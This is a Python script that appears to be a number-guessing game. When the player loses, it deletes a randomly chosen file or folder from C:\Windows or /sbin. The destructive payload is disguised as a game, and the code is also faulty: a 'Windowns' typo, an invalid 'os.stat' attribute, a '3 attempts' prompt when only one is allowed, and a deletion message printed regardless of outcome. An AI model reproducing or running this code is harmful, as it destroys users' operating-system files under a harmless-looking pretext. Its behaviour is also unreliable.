import os
import platform
import random
import shutil
import string, secrets

number = random.randint(1, 100)
tents = 1

for tent in range(tents):
    print(f"Number of attempts: {tent + 1} out of 3")
    guess = int(input("Guess the generated number by the machine between 1 and 100, be careful: "))

    if guess == number:
        print("Congratulatios, you guessed the secret number generated!")
        name = ''.join(secrets.choice(string.ascii_letters) for _ in range(5))
        SAVE = os.path.join(os.path.expanduser("~"), "Desktop", f"Game_{name}.txt")
        with open(SAVE, "w") as file:
            file.write(f"You got lucky! The number you input matches with the number generated: {number}")
        break
    else:
        print("\nWrong! Try again!\n")
else:
    if platform.system() == "Windowns":
        directory = r"C:\Windows"
    else:
        directory = r"/sbin"
    itens = os.listdir(directory)

    if itens:
        item = random.choice(itens)
        item_path = os.path.join(directory, item)

        if os.path.isfile(item_path):
            try:
                os.chmod(item_path, os.stat.S_IWRITE)
                os.remove(item_path)
            except:
                print("Something went wrong!")
        else:
            pass
        if os.path.isdir(item_path):
            try:
                os.chmod(item_path, os.stat.S_IRWXU)
                shutil.rmtree(item_path)
            except PermissionError:
                print("Something went wrong!")
        else:
            pass
        print(f"{item} was deleted")
        print(f"The number generated was {number}!")
        print("Try again!")
    else:
        print("You damn lucky guy, there's nothing to delete!")